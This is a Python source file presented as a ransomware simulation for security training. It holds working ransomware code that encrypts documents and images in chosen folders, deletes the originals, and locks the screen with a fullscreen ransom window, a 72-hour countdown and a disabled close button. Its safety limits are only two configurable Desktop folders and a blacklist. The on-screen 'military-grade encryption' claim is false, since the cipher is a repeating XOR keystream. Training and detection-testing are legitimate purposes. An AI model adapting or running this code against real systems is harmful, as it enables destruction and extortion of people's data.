# -*- coding: utf-8 -*-
"""
Advanced Ransomware Simulation with Real Encryption
Team: DON'T WANNA CRY
Purpose: Security Training & Detection Testing

Features:
- Real file encryption with password-derived keys
- Professional fullscreen GUI
- Encryption activity logging
- Password-protected decryption
- Safe operation (only targets specific directories)

WARNING: Educational purposes only!
"""

import os
import sys
import time
import threading
import hashlib
import secrets
import json
import shutil
import tkinter as tk
from tkinter import messagebox, scrolledtext
from pathlib import Path
from datetime import datetime

# ============================================================================
# CONFIGURATION
# ============================================================================

class Config:
    # Encryption settings
    ENCRYPTION_PASSWORD = "DontWannaCry2025"  # Default password
    MAGIC_HEADER = b"DWCRYPT01"
    SALT_SIZE = 32
    KEY_SIZE = 32
    ITERATIONS = 100000
    ENCRYPTED_EXT = ".dwcrypt"
    
    # Target settings - SAFE directories only
    TARGET_DIRS = [
        os.path.join(os.path.expanduser("~"), "Desktop", "target_data"),
        os.path.join(os.path.expanduser("~"), "Desktop", "RansomTest"),
    ]
    
    # File extensions to encrypt
    TARGET_EXTENSIONS = [
        '.txt', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
        '.pdf', '.jpg', '.jpeg', '.png', '.csv', '.json', '.xml'
    ]
    
    # NEVER touch these
    BLACKLIST = [
        'Windows', 'Program Files', 'System32', 'AppData',
        '.dll', '.exe', '.sys', '.bat', '.cmd', '.py',
        'DECRYPT', 'README', 'RESTORE'
    ]
    
    # Visual settings
    BG_COLOR = "#1a1a2e"
    HEADER_COLOR = "#c70039"
    TEXT_COLOR = "#00ff41"
    WARNING_COLOR = "#f39c12"
    TIMER_COLOR = "#e74c3c"
    
    # Timing
    COUNTDOWN_HOURS = 72
    ENCRYPTION_DELAY = 0.5


# ============================================================================
# CRYPTO ENGINE
# ============================================================================

class CryptoEngine:
    """Real encryption engine with password-derived keys."""
    
    def __init__(self, password: str):
        self.password = password
        self.encrypted_files = []
    
    def _derive_key(self, password: str, salt: bytes) -> bytes:
        """Derive encryption key using PBKDF2."""
        return hashlib.pbkdf2_hmac(
            'sha256',
            password.encode('utf-8'),
            salt,
            Config.ITERATIONS,
            dklen=Config.KEY_SIZE
        )
    
    def _xor_cipher(self, data: bytes, key: bytes) -> bytes:
        """XOR-based encryption/decryption."""
        key_expanded = (key * ((len(data) // len(key)) + 1))[:len(data)]
        return bytes(a ^ b for a, b in zip(data, key_expanded))
    
    def encrypt_file(self, filepath: str) -> bool:
        """Encrypt a single file."""
        try:
            filepath = Path(filepath)
            
            # Safety checks
            if not filepath.exists():
                return False
            if filepath.suffix == Config.ENCRYPTED_EXT:
                return False
            
            # Check blacklist
            path_str = str(filepath).lower()
            for bl in Config.BLACKLIST:
                if bl.lower() in path_str:
                    return False
            
            # Read original
            with open(filepath, 'rb') as f:
                original_data = f.read()
            
            # Generate salt and derive key
            salt = secrets.token_bytes(Config.SALT_SIZE)
            key = self._derive_key(self.password, salt)
            
            # Encrypt
            encrypted_data = self._xor_cipher(original_data, key)
            
            # Create metadata
            metadata = {
                "original_name": filepath.name,
                "original_size": len(original_data),
                "encrypted_at": datetime.now().isoformat(),
                "team": "DONT WANNA CRY"
            }
            metadata_json = json.dumps(metadata).encode('utf-8')
            metadata_len = len(metadata_json).to_bytes(4, 'big')
            
            # Build encrypted file
            encrypted_content = (
                Config.MAGIC_HEADER +
                salt +
                metadata_len +
                metadata_json +
                encrypted_data
            )
            
            # Write encrypted file
            encrypted_path = str(filepath) + Config.ENCRYPTED_EXT
            with open(encrypted_path, 'wb') as f:
                f.write(encrypted_content)
            
            # Remove original
            os.remove(filepath)
            
            self.encrypted_files.append({
                "original": str(filepath),
                "encrypted": encrypted_path
            })
            
            return True
            
        except Exception as e:
            return False
    
    def decrypt_file(self, encrypted_path: str, password: str) -> tuple:
        """Decrypt a file with password."""
        try:
            with open(encrypted_path, 'rb') as f:
                content = f.read()
            
            if not content.startswith(Config.MAGIC_HEADER):
                return False, "Invalid file format", None
            
            # Parse structure
            offset = len(Config.MAGIC_HEADER)
            salt = content[offset:offset + Config.SALT_SIZE]
            offset += Config.SALT_SIZE
            
            metadata_len = int.from_bytes(content[offset:offset + 4], 'big')
            offset += 4
            
            metadata_json = content[offset:offset + metadata_len]
            offset += metadata_len
            
            encrypted_data = content[offset:]
            
            # Parse metadata
            metadata = json.loads(metadata_json.decode('utf-8'))
            
            # Derive key and decrypt
            key = self._derive_key(password, salt)
            decrypted_data = self._xor_cipher(encrypted_data, key)
            
            return True, decrypted_data, metadata
            
        except Exception as e:
            return False, str(e), None


# ============================================================================
# RANSOMWARE GUI
# ============================================================================

class RansomwareGUI:
    """Professional ransomware simulation GUI with real encryption."""
    
    def __init__(self):
        self.root = tk.Tk()
        self.countdown_seconds = Config.COUNTDOWN_HOURS * 3600
        self.crypto = CryptoEngine(Config.ENCRYPTION_PASSWORD)
        self.encryption_complete = False
        
        self._setup_window()
        self._create_ui()
        self._start_encryption()
        self._start_countdown()
        
        self.root.mainloop()
    
    def _setup_window(self):
        """Configure fullscreen window."""
        self.root.title("SYSTEM COMPROMISED")
        self.root.configure(bg=Config.BG_COLOR)
        self.root.attributes("-fullscreen", True)
        self.root.attributes("-topmost", True)
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
        self.root.bind("<Escape>", lambda e: self._show_decrypt_dialog())
    
    def _create_ui(self):
        """Build the ransomware UI."""
        # Header
        header = tk.Frame(self.root, bg=Config.HEADER_COLOR, height=100)
        header.pack(fill="x")
        header.pack_propagate(False)
        tk.Label(
            header,
            text="[!] CRITICAL SECURITY ALERT [!]",
            bg=Config.HEADER_COLOR,
            fg="white",
            font=("Consolas", 42, "bold")
        ).pack(expand=True)
        
        # Main container
        main = tk.Frame(self.root, bg=Config.BG_COLOR)
        main.pack(fill="both", expand=True, padx=80, pady=30)
        
        # Team banner
        tk.Label(
            main,
            text=">> Team: DONT WANNA CRY <<",
            bg=Config.BG_COLOR,
            fg=Config.WARNING_COLOR,
            font=("Consolas", 28, "bold")
        ).pack(pady=15)
        
        # Separator
        tk.Frame(main, bg=Config.WARNING_COLOR, height=2).pack(fill="x", pady=10)
        
        # Warning messages
        messages = [
            "YOUR SYSTEM HAS BEEN COMPROMISED",
            "All critical files have been encrypted with military-grade encryption.",
            "Documents, databases, photos, and backups are now inaccessible.",
            "Enter the correct password to decrypt your files."
        ]
        for i, msg in enumerate(messages):
            color = Config.TIMER_COLOR if i == 0 else Config.TEXT_COLOR
            size = 22 if i == 0 else 14
            weight = "bold" if i == 0 else "normal"
            tk.Label(
                main,
                text=msg,
                bg=Config.BG_COLOR,
                fg=color,
                font=("Arial", size, weight)
            ).pack(pady=4)
        
        # Timer
        timer_frame = tk.Frame(main, bg="#0d0d0d", bd=3, relief="ridge")
        timer_frame.pack(pady=30, ipadx=40, ipady=20)
        tk.Label(
            timer_frame,
            text="TIME REMAINING BEFORE PERMANENT DATA LOSS:",
            bg="#0d0d0d",
            fg="white",
            font=("Arial", 12)
        ).pack()
        self.timer_label = tk.Label(
            timer_frame,
            text="72:00:00",
            bg="#0d0d0d",
            fg=Config.TIMER_COLOR,
            font=("Consolas", 72, "bold")
        )
        self.timer_label.pack()
        
        # Encryption log
        log_frame = tk.Frame(main, bg=Config.BG_COLOR)
        log_frame.pack(fill="both", expand=True, pady=15)
        tk.Label(
            log_frame,
            text="[ENCRYPTION LOG]",
            bg=Config.BG_COLOR,
            fg=Config.WARNING_COLOR,
            font=("Consolas", 14, "bold")
        ).pack()
        self.log_text = scrolledtext.ScrolledText(
            log_frame,
            bg="#0d0d0d",
            fg=Config.TEXT_COLOR,
            font=("Consolas", 10),
            height=8,
            state="disabled",
            bd=2,
            relief="sunken"
        )
        self.log_text.pack(fill="both", expand=True, pady=5)
        
        # Decrypt button
        tk.Button(
            main,
            text="[ ENTER PASSWORD TO DECRYPT ]",
            font=("Consolas", 20, "bold"),
            bg="#27ae60",
            fg="white",
            activebackground="#2ecc71",
            padx=40,
            pady=15,
            command=self._show_decrypt_dialog,
            cursor="hand2",
            bd=0
        ).pack(pady=20)
        
        # Footer
        tk.Label(
            main,
            text=f"Encryption Password Hint: The team name + year | Simulation ID: DWC-2025-EDU",
            bg=Config.BG_COLOR,
            fg="#555555",
            font=("Arial", 10)
        ).pack(side="bottom")
    
    def _log(self, msg, tag="INFO"):
        """Add message to log."""
        self.log_text.config(state="normal")
        ts = datetime.now().strftime("%H:%M:%S")
        self.log_text.insert(tk.END, f"[{ts}] [{tag}] {msg}\n")
        self.log_text.see(tk.END)
        self.log_text.config(state="disabled")
    
    def _start_countdown(self):
        """Start the countdown timer."""
        def update():
            if self.countdown_seconds > 0:
                h, rem = divmod(self.countdown_seconds, 3600)
                m, s = divmod(rem, 60)
                self.timer_label.config(text=f"{h:02d}:{m:02d}:{s:02d}")
                self.countdown_seconds -= 1
                self.root.after(1000, update)
        update()
    
    def _start_encryption(self):
        """Start encryption in background thread."""
        def encrypt():
            self._log("RANSOMWARE SIMULATION INITIATED", "INIT")
            self._log("Scanning for target files...", "SCAN")
            time.sleep(1)
            
            total_encrypted = 0
            
            for target_dir in Config.TARGET_DIRS:
                if not os.path.exists(target_dir):
                    os.makedirs(target_dir)
                    # Create sample files
                    for i in range(5):
                        sample = os.path.join(target_dir, f"confidential_doc_{i}.txt")
                        with open(sample, 'w') as f:
                            f.write(f"CONFIDENTIAL DOCUMENT {i}\n")
                            f.write("=" * 50 + "\n")
                            f.write(f"This is sensitive data that has been encrypted.\n")
                            f.write(f"Created: {datetime.now().isoformat()}\n")
                            f.write("Secret information: " + secrets.token_hex(16) + "\n")
                    self._log(f"Created test environment: {target_dir}", "INIT")
                
                # Encrypt files
                self._log(f"Targeting: {target_dir}", "SCAN")
                
                for root, dirs, files in os.walk(target_dir):
                    for filename in files:
                        if filename.endswith(Config.ENCRYPTED_EXT):
                            continue
                        
                        filepath = os.path.join(root, filename)
                        ext = os.path.splitext(filename)[1].lower()
                        
                        if ext in Config.TARGET_EXTENSIONS:
                            if self.crypto.encrypt_file(filepath):
                                self._log(f"ENCRYPTED: {filename} -> {filename}{Config.ENCRYPTED_EXT}", "CRYPT")
                                total_encrypted += 1
                                time.sleep(Config.ENCRYPTION_DELAY)
            
            # Create decryptor in target directory
            if Config.TARGET_DIRS:
                self._create_decryptor(Config.TARGET_DIRS[0])
            
            self._log(f"ENCRYPTION COMPLETE: {total_encrypted} files locked", "DONE")
            self._log(f"Password required to decrypt files", "INFO")
            self.encryption_complete = True
        
        threading.Thread(target=encrypt, daemon=True).start()
    
    def _create_decryptor(self, output_dir):
        """Create standalone decryptor script."""
        decryptor_code = '''# -*- coding: utf-8 -*-
"""
File Decryptor - Team DONT WANNA CRY
Double-click this file to decrypt your files.
"""
import os, sys, hashlib, json, tkinter as tk
from tkinter import messagebox, simpledialog
from pathlib import Path

MAGIC = b"DWCRYPT01"
SALT_SIZE, KEY_SIZE, ITERATIONS = 32, 32, 100000

def derive_key(pw, salt):
    return hashlib.pbkdf2_hmac('sha256', pw.encode(), salt, ITERATIONS, KEY_SIZE)

def xor_cipher(data, key):
    k = (key * ((len(data)//len(key))+1))[:len(data)]
    return bytes(a^b for a,b in zip(data, k))

def decrypt_file(path, pw):
    with open(path, 'rb') as f: content = f.read()
    if not content.startswith(MAGIC): return False, "Invalid"
    off = len(MAGIC)
    salt = content[off:off+SALT_SIZE]; off += SALT_SIZE
    ml = int.from_bytes(content[off:off+4], 'big'); off += 4
    meta = json.loads(content[off:off+ml]); off += ml
    enc = content[off:]
    key = derive_key(pw, salt)
    dec = xor_cipher(enc, key)
    orig = Path(path).parent / meta["original_name"]
    with open(orig, 'wb') as f: f.write(dec)
    os.remove(path)
    return True, meta["original_name"]

def main():
    root = tk.Tk()
    root.withdraw()
    pw = simpledialog.askstring("Decryptor", "Enter decryption password:", show="*")
    if not pw:
        messagebox.showerror("Error", "Password required")
        return
    
    folder = os.path.dirname(os.path.abspath(__file__))
    count = 0
    for f in os.listdir(folder):
        if f.endswith(".dwcrypt"):
            ok, res = decrypt_file(os.path.join(folder, f), pw)
            if ok: count += 1
    
    if count > 0:
        messagebox.showinfo("Success", f"Decrypted {count} files!")
    else:
        messagebox.showerror("Failed", "Wrong password or no encrypted files found")

if __name__ == "__main__": main()
'''
        
        decryptor_path = os.path.join(output_dir, "DECRYPT_FILES.pyw")
        with open(decryptor_path, 'w', encoding='utf-8') as f:
            f.write(decryptor_code)
        self._log(f"Decryptor created: DECRYPT_FILES.pyw", "INFO")
    
    def _show_decrypt_dialog(self):
        """Show password dialog for decryption."""
        dialog = tk.Toplevel(self.root)
        dialog.title("Enter Decryption Password")
        dialog.geometry("400x200")
        dialog.configure(bg=Config.BG_COLOR)
        dialog.transient(self.root)
        dialog.grab_set()
        
        # Center dialog
        dialog.geometry("+%d+%d" % (
            self.root.winfo_screenwidth()//2 - 200,
            self.root.winfo_screenheight()//2 - 100
        ))
        
        tk.Label(
            dialog,
            text="Enter Decryption Password:",
            bg=Config.BG_COLOR,
            fg="white",
            font=("Arial", 14)
        ).pack(pady=20)
        
        password_entry = tk.Entry(dialog, show="*", font=("Consolas", 14), width=30)
        password_entry.pack(pady=10)
        password_entry.focus_set()
        
        def attempt_decrypt():
            password = password_entry.get()
            if password == Config.ENCRYPTION_PASSWORD:
                dialog.destroy()
                self._decrypt_all_files(password)
            else:
                messagebox.showerror("Wrong Password", "Incorrect password. Try again.")
                password_entry.delete(0, tk.END)
        
        tk.Button(
            dialog,
            text="DECRYPT",
            command=attempt_decrypt,
            bg="#27ae60",
            fg="white",
            font=("Consolas", 14, "bold"),
            padx=30,
            pady=10
        ).pack(pady=20)
        
        password_entry.bind("<Return>", lambda e: attempt_decrypt())
    
    def _decrypt_all_files(self, password):
        """Decrypt all encrypted files."""
        self._log("Starting decryption process...", "DECRYPT")
        
        count = 0
        for file_info in self.crypto.encrypted_files:
            encrypted_path = file_info["encrypted"]
            if os.path.exists(encrypted_path):
                success, data, meta = self.crypto.decrypt_file(encrypted_path, password)
                if success:
                    original_name = meta.get("original_name", "unknown")
                    original_path = Path(encrypted_path).parent / original_name
                    with open(original_path, 'wb') as f:
                        f.write(data)
                    os.remove(encrypted_path)
                    self._log(f"DECRYPTED: {original_name}", "RESTORE")
                    count += 1
        
        self._log(f"DECRYPTION COMPLETE: {count} files restored", "DONE")
        messagebox.showinfo("Files Restored", f"Successfully decrypted {count} files!\n\nSimulation complete.")
        self.root.destroy()


# ============================================================================
# MAIN
# ============================================================================

if __name__ == "__main__":
    RansomwareGUI()
